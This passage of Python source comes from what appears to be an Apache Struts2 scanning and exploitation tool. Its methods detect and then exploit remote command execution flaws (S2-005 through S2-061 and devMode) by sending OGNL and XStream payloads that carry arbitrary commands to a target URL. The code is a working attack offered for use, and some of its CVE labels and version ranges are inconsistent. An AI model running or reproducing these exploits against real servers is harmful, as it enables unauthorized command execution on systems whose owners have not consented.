        self.vul_info["vul_numb"] = "CVE-2016-3081"
        self.vul_info["vul_apps"] = "Struts2"
        self.vul_info["vul_date"] = "2016-08-08"
        self.vul_info["vul_vers"] = "2.3.20 - 2.3.28"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "remote command execution"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = 'Remote Code Execution can be performed via method: prefix when Dynamic Method Invocation is enabled.'
        self.vul_info["cre_date"] = "2021-01-30"
        self.vul_info["cre_auth"] = "zhzyker"
        md = random_md5()
        cmd = "echo " + md
        self.payload = self.payload_s2_032.replace("RECOMMAND", cmd)
        try:
            self.req = requests.get(self.url + self.payload, headers=self.headers, timeout=self.timeout, verify=False)
            if md in misinformation(self.req.text, md):
                self.vul_info["vul_data"] = dump.dump_all(self.req).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["vul_payd"] = self.payload
                self.vul_info["prt_info"] = "[rce] [cmd: " + cmd + "]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as e:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def s2_045_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Apache Struts2: S2-045"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "Struts2 Remote Code Execution"
        self.vul_info["vul_numb"] = "CVE-2017-5638"
        self.vul_info["vul_apps"] = "Struts2"
        self.vul_info["vul_date"] = "2017-03-19"
        self.vul_info["vul_vers"] = "2.3.20 - 2.3.28"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "remote command execution"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "Possible Remote Code Execution when performing file upload based on Jakarta Multipart parser."
        self.vul_info["cre_date"] = "2021-02-26"
        self.vul_info["cre_auth"] = "zhzyker"
        md = random_md5()
        cmd = "echo " + md
        headers_1 = {
            'User-Agent': self.ua,
            'Content-Type': self.payload_s2_045.replace("RECOMMAND", cmd)
        }
        headers_2 = {
            'User-Agent': self.ua,
            'Content-Type': '${#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].'
                            'addHeader("FUCK",233*233)}.multipart/form-data'
        }
        try:
            self.request = requests.post(self.url, headers=headers_1, timeout=self.timeout, verify=False)
            if md in misinformation(self.request.text, md):
                self.vul_info["vul_data"] = dump.dump_all(self.request).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["vul_payd"] = self.payload_s2_045.replace("RECOMMAND", cmd)
                self.vul_info["prt_info"] = "[rce] [cmd: " + cmd + "]"
            else:
                self.request = requests.post(self.url, headers=headers_2, timeout=self.timeout, verify=False)
                if r"54289" in self.request.headers['FUCK']:
                    self.vul_info["vul_data"] = dump.dump_all(self.request).decode('utf-8', 'ignore')
                    self.vul_info["prt_resu"] = "PoCSuCCeSS"
                    self.vul_info["vul_payd"] = '${#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].addHeader("FUCK",233*233)}.multipart/form-data'
                    self.vul_info["prt_info"] = "[rce] [cmd: 233*233]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def s2_046_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Apache Struts2: S2-046"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "Struts2 Remote Code Execution"
        self.vul_info["vul_numb"] = "CVE-2017-5638"
        self.vul_info["vul_apps"] = "Struts2"
        self.vul_info["vul_date"] = "2017-09-22"
        self.vul_info["vul_vers"] = "2.3.5-31, 2.5.0-10"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "remote command execution"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "It is possible to perform a RCE attack with a malicious Content-Disposition " \
                                    "value or with improper Content-Length header. If the Content-Disposition / " \
                                    "Content-Length value is not valid an exception is thrown which is then used to " \
                                    "display an error message to a user. This is a different vector for the same " \
                                    "vulnerability described in S2-045 (CVE-2017-5638)."
        self.vul_info["cre_date"] = "2021-01-30"
        self.vul_info["cre_auth"] = "zhzyker"
        md = random_md5()
        cmd = "echo " + md
        self.headers = {
            'User-Agent': self.ua,
            'Content-Type': 'multipart/form-data; boundary=---------------------------'
        }
        self.payload = self.payload_s2_046.replace("RECOMMAND", cmd)
        try:
            self.req = requests.post(self.url, data=self.payload, headers=self.headers, timeout=self.timeout, verify=False)
            if md in misinformation(self.req.text, md):
                self.vul_info["vul_data"] = dump.dump_all(self.req).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["vul_payd"] = self.payload
                self.vul_info["prt_info"] = "[rce] [cmd: " + cmd + "]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as e:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def s2_048_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Apache Struts2: S2-048"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "Struts2 Remote Code Execution"
        self.vul_info["vul_numb"] = "CVE-2017-9791"
        self.vul_info["vul_apps"] = "Struts2"
        self.vul_info["vul_date"] = "2017-07-07"
        self.vul_info["vul_vers"] = "2.3.x"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "remote command execution"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "It is possible to perform a RCE attack with a malicious field value when using " \
                                    "the Struts 2 Struts 1 plugin and it's a Struts 1 action and the value is a part " \
                                    "of a message presented to the user, i.e. when using untrusted input as a part of " \
                                    "the error message in the ActionMessage class."
        self.vul_info["cre_date"] = "2021-01-30"
        self.vul_info["cre_auth"] = "zhzyker"
        md = random_md5()
        cmd = "echo " + md
        if r"saveGangster.action" not in self.url:
            self.u = self.url + "/integration/saveGangster.action"
        self.data = {
            'name': self.payload_s2_048.replace("RECOMMAND", cmd),
            'age': '233',
            '__checkbox_bustedBefore': 'true',
            'description': '233'
        }
        try:
            self.req = requests.post(self.u, data=self.data, headers=self.headers, timeout=self.timeout, verify=False)
            if md in misinformation(self.req.text, md):
                self.vul_info["vul_data"] = dump.dump_all(self.req).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["vul_payd"] = self.payload_s2_048.replace("RECOMMAND", cmd)
                self.vul_info["prt_info"] = "[rce] [cmd: " + cmd + "]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as e:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def s2_052_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Apache Struts2: S2-052"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "Struts REST plugin Remote Code Execution"
        self.vul_info["vul_numb"] = "CVE-2017-9805"
        self.vul_info["vul_apps"] = "Struts2"
        self.vul_info["vul_date"] = "2017-08-08"
        self.vul_info["vul_vers"] = "2.1.2 - 2.3.33, 2.5 - 2.5.12"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "remote command execution"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "A RCE attack is possible when using the Struts REST plugin with XStream handler " \
                                    "to deserialise XML requests"
        self.vul_info["cre_date"] = "2021-01-30"
        self.vul_info["cre_auth"] = "zhzyker"
        md = random_md5()
        cmd = "echo " + md
        self.payload = self.payload_s2_052.replace("RECOMMAND", cmd)
        self.headers = {
            'Accept': 'text/html, application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'User-agent': self.ua,
            'Content-Type': 'application/xml'
        }
        try:
            self.req = requests.post(self.url, data=self.payload, headers=self.headers, timeout=self.timeout, verify=False)
            if md in misinformation(self.req.text, md):
                self.vul_info["vul_data"] = dump.dump_all(self.req).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["vul_payd"] = self.payload
                self.vul_info["prt_info"] = "[rce] [cmd: " + cmd + "]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as e:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def s2_057_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Apache Struts2: S2-057"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "Struts namespace Remote Code Execution"
        self.vul_info["vul_numb"] = "CVE-2018-11776"
        self.vul_info["vul_apps"] = "Struts2"
        self.vul_info["vul_date"] = "2018-01-20"
        self.vul_info["vul_vers"] = "2.0.4 - 2.3.34, 2.5.0-2.5.16"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "remote command execution"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "Possible Remote Code Execution when alwaysSelectFullNamespace is true " \
                                    "(either by user or a plugin like Convention Plugin) and then: results are " \
                                    "used with no namespace and in same time, its upper package have no or " \
                                    "wildcard namespace and similar to results, same possibility when using url " \
                                    "tag which doesn’t have value and action set and in same time, its upper " \
                                    "package have no or wildcard namespace."
        self.vul_info["cre_date"] = "2021-01-30"
        self.vul_info["cre_auth"] = "zhzyker"
        md = dns_request()
        cmd = "ping " + md
        self.payload = self.payload_s2_057.replace("RECOMMAND", cmd)
        try:
            self.req = requests.get(self.url + self.payload, headers=self.headers, timeout=self.timeout, verify=False)
            if dns_result(md):
                self.vul_info["vul_data"] = dump.dump_all(self.req).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["vul_payd"] = self.payload
                self.vul_info["prt_info"] = "[dns] [cmd: " + cmd + "]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as e:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def s2_059_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Apache Struts2: S2-059"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "Struts ognl interpreter Remote Code Execution"
        self.vul_info["vul_numb"] = "CVE-2019-0230"
        self.vul_info["vul_apps"] = "Struts2"
        self.vul_info["vul_date"] = "2019-08-13"
        self.vul_info["vul_vers"] = "2.0.0 - 2.5.20"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "remote command execution"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "Forced double OGNL evaluation, when evaluated on raw user input in tag attributes," \
                                    " may lead to remote code execution."
        self.vul_info["cre_date"] = "2021-01-30"
        self.vul_info["cre_auth"] = "zhzyker"
        md = random_md5()
        cmd = "echo " + md
        self.payload = self.payload_s2_059.replace("RECOMMAND", cmd)
        if r"?" not in self.url:
            self.url_059 = self.url + "?id="
        try:
            self.req = requests.post(self.url_059, data=self.payload, headers=self.headers, timeout=self.timeout, verify=False)
            if md in misinformation(self.req.text, md):
                self.vul_info["vul_data"] = dump.dump_all(self.req).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["vul_payd"] = self.payload
                self.vul_info["prt_info"] = "[rce] [cmd: " + cmd + "]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as e:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def s2_061_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Apache Struts2: S2-061"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "Struts Remote Code Execution"
        self.vul_info["vul_numb"] = "CVE-2020-17530"
        self.vul_info["vul_apps"] = "Struts2"
        self.vul_info["vul_date"] = "2020-08-12"
        self.vul_info["vul_vers"] = "2.0.0 - 2.5.25"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "remote command execution"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "Forced double OGNL evaluation, when evaluated on raw user input in tag attributes," \
                                    " may lead to remote code execution."
        self.vul_info["cre_date"] = "2021-01-30"
        self.vul_info["cre_auth"] = "zhzyker"
        md = random_md5()
        cmd = "echo " +  md
        self.payload = self.payload_s2_061.replace("RECOMMAND", cmd)
        if r"?" not in self.url:
            self.url_061 = self.url + "/?id="
        try:
            self.req = requests.get(self.url_061 + self.payload, headers=self.headers, timeout=self.timeout, verify=False)
            req = re.findall(r'<a id="(.*)', self.req.text)[0]
            if md in misinformation(req, md):
                self.vul_info["vul_data"] = dump.dump_all(self.req).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["vul_payd"] = self.payload
                self.vul_info["prt_info"] = "[rce] [cmd: " + cmd + "]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as e:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def s2_devMode_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Apache Struts2: S2-devMode"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "Struts2 devMode Remote command execution"
        self.vul_info["vul_numb"] = "CVE-2020-17530"
        self.vul_info["vul_apps"] = "Struts2"
        self.vul_info["vul_date"] = "2020-08-12"
        self.vul_info["vul_vers"] = "2.1.0 - 2.5.1"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "remote command execution"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "Struts2 devMode Remote command execution"
        self.vul_info["cre_date"] = "2021-01-30"
        self.vul_info["cre_auth"] = "zhzyker"
        md = random_md5()
        cmd = "echo " + md
        self.payload = self.payload_s2_devMode.replace("RECOMMAND", cmd)
        try:
            self.req = requests.get(self.url + self.payload, headers=self.headers, timeout=self.timeout, verify=False, allow_redirects=False)
            if md in misinformation(self.req.text, md):
                self.vul_info["vul_data"] = dump.dump_all(self.req).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["vul_payd"] = self.payload
                self.vul_info["prt_info"] = "[rce] [cmd: " + cmd + "]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as e:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def s2_005_exp(self, cmd):
        vul_name = "Apache Struts2: S2-005"
        self.payload = self.payload_s2_005.replace("RECOMMAND", cmd)
        try:
            self.req = requests.post(self.url, headers=self.headers, data=self.payload, timeout=self.timeout, verify=False)
            self.raw_data = dump.dump_all(self.req).decode('utf-8', 'ignore')
            verify.exploit_print(self.req.text, self.raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception:
            verify.error_print(vul_name)

    def s2_008_exp(self, cmd):
        vul_name = "Apache Struts2: S2-008"
        self.payload = self.payload_s2_008.replace("RECOMMAND", cmd)
        try:
            self.req = requests.get(self.url + self.payload, headers=self.headers, timeout=self.timeout, verify=False)
            self.raw_data = dump.dump_all(self.req).decode('utf-8', 'ignore')
            verify.exploit_print(self.req.text, self.raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception:
            verify.error_print(vul_name)

    def s2_009_exp(self, cmd):
        vul_name = "Apache Struts2: S2-009"
        self.payload = self.payload_s2_009.replace("RECOMMAND", cmd)
        try:
            self.req = requests.post(self.url, data=self.payload, headers=self.headers, timeout=self.timeout, verify=False)
            self.raw_data = dump.dump_all(self.req).decode('utf-8', 'ignore')
            verify.exploit_print(self.req.text, self.raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception:
            verify.error_print(vul_name)

    def s2_013_exp(self, cmd):
        vul_name = "Apache Struts2: S2-013"
        self.payload = self.payload_s2_013.replace("RECOMMAND", cmd)
        try:
            self.req = requests.get(self.url + self.payload, headers=self.headers, timeout=self.timeout, verify=False)
            self.raw_data = dump.dump_all(self.req).decode('utf-8', 'ignore')
            verify.exploit_print(self.req.text, self.raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception:
            verify.error_print(vul_name)

    def s2_015_exp(self, cmd):
        vul_name = "Apache Struts2: S2-015"
        self.payload = self.payload_s2_015.replace("RECOMMAND", cmd)
        try:
            self.req = requests.get(self.url + self.payload, headers=self.headers, timeout=self.timeout, verify=False)
            self.raw_data = dump.dump_all(self.req).decode('utf-8', 'ignore')
            verify.exploit_print(self.req.text, self.raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception:
            verify.error_print(vul_name)
        self.threadLock.release()

    def s2_016_exp(self, cmd):
        vul_name = "Apache Struts2: S2-016"
        self.payload_1 = self.payload_s2_016_1.replace("RECOMMAND", cmd)
        try:
            self.req = requests.get(self.url + self.payload_1, headers=self.headers, timeout=self.timeout, verify=False)
            self.raw_data = dump.dump_all(self.req).decode('utf-8', 'ignore')
            verify.exploit_print(self.req.text, self.raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception:
            verify.error_print(vul_name)

    def s2_029_exp(self, cmd):
        vul_name = "Apache Struts2: S2-029"
        self.payload = self.payload_s2_029.replace("RECOMMAND", cmd)
        if r"?" not in self.url:
            self.url_029 = self.url + "?id="
        try:
            self.req = requests.get(self.url_029 + self.payload, headers=self.headers, timeout=self.timeout, verify=False)
            self.raw_data = dump.dump_all(self.req).decode('utf-8', 'ignore')
            verify.exploit_print(self.req.text, self.raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception:
            verify.error_print(vul_name)

    def s2_032_exp(self, cmd):
        vul_name = "Apache Struts2: S2-032"
        self.payload = self.payload_s2_032.replace("RECOMMAND", cmd)
        try:
            self.req = requests.get(self.url + self.payload, headers=self.headers, timeout=self.timeout, verify=False)
            self.raw_data = dump.dump_all(self.req).decode('utf-8', 'ignore')
            verify.exploit_print(self.req.text, self.raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception:
            verify.error_print(vul_name)

    def s2_045_exp(self, cmd):
        vul_name = "Apache Struts2: S2-045"
        headers = {
            'User-Agent': self.ua,
            'Content-Type': self.payload_s2_045.replace("RECOMMAND", cmd)
        }
        try:
            self.req = requests.post(self.url, headers=headers, timeout=self.timeout, verify=False)
            self.raw_data = dump.dump_all(self.req).decode('utf-8', 'ignore')
            verify.exploit_print(self.req.text, self.raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception as e:
            verify.error_print(vul_name)

    def s2_046_exp(self, cmd):
        vul_name = "Apache Struts2: S2-046"
        self.headers = {
            'User-Agent': self.ua,
            'Content-Type': 'multipart/form-data; boundary=---------------------------'
        }
        self.payload = self.payload_s2_046.replace("RECOMMAND", cmd)
        try:
            self.req = requests.post(self.url, data=self.payload, headers=self.headers, timeout=self.timeout, verify=False)
            self.raw_data = dump.dump_all(self.req).decode('utf-8', 'ignore')
            verify.exploit_print(self.req.text, self.raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception:
            verify.error_print(vul_name)

    def s2_048_exp(self, cmd):
        vul_name = "Apache Struts2: S2-048"
        if r"saveGangster.action" not in self.url:
            self.u = self.url + "/integration/saveGangster.action"
        self.data = {
            'name': self.payload_s2_048.replace("RECOMMAND", cmd),
            'age': '233',
            '__checkbox_bustedBefore': 'true',
            'description': '233'
        }
        try:
            self.req = requests.post(self.u, data=self.data, headers=self.headers, timeout=self.timeout, verify=False)
            self.raw_data = dump.dump_all(self.req).decode('utf-8', 'ignore')
            verify.exploit_print(self.req.text, self.raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception:
            verify.error_print(vul_name)

    def s2_052_exp(self, cmd):
        vul_name = "Apache Struts2: S2-052"
        self.payload = self.payload_s2_052.replace("RECOMMAND", cmd)
        self.headers = {
            'Accept': 'text/html, application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'User-agent': self.ua,
            'Content-Type': 'application/xml'
        }
        try:
            self.req = requests.post(self.url, data=self.payload, headers=self.headers, timeout=self.timeout, verify=False)
            self.raw_data = dump.dump_all(self.req).decode('utf-8', 'ignore')
            verify.exploit_print(self.req.text, self.raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception:
            verify.error_print(vul_name)

    def s2_057_exp(self, cmd):
        vul_name = "Apache Struts2: S2-057"
        self.payload = self.payload_s2_057.replace("RECOMMAND", cmd)
        try:
            self.req = requests.get(self.url + self.payload, headers=self.headers, timeout=self.timeout, verify=False)
            r = "Command Executed Successfully (But No Echo)"
            self.raw_data = dump.dump_all(self.req).decode('utf-8', 'ignore')
            verify.exploit_print(r, self.raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception:
            verify.error_print(vul_name)

    def s2_059_exp(self, cmd):
        vul_name = "Apache Struts2: S2-059"
        self.payload = self.payload_s2_059.replace("RECOMMAND", cmd)
        if r"?" not in self.url:
            self.url_059 = self.url + "?id="
        try:
            self.req = requests.post(self.url_059, data=self.payload, headers=self.headers, timeout=self.timeout, verify=False)
            self.raw_data = dump.dump_all(self.req).decode('utf-8', 'ignore')
            verify.exploit_print(self.data, self.raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception:
            verify.error_print(vul_name)

    def s2_061_exp(self, cmd):
        vul_name = "Apache Struts2: S2-061"
        self.payload = self.payload_s2_061.replace("RECOMMAND", cmd)
        if r"?" not in self.url:
            self.url_061 = self.url + "/?id="
        try:
            self.req = requests.get(self.url_061 + self.payload, headers=self.headers, timeout=self.timeout, verify=False)
            self.raw_data = dump.dump_all(self.req).decode('utf-8', 'ignore')
            verify.exploit_print(self.req.text, self.raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception:
            verify.error_print(vul_name)

    def s2_devMode_exp(self, cmd):
        vul_name = "Apache Struts2: S2-devMode"
        self.payload = self.payload_s2_devMode.replace("RECOMMAND", cmd)
        try:
            self.req = requests.get(self.url + self.payload, headers=self.headers, timeout=self.timeout, verify=False, allow_redirects=False)
            self.raw_data = dump.dump_all(self.req).decode('utf-8', 'ignore')
            verify.exploit_print(self.req.text, self.raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception:
            verify.error_print(vul_name)
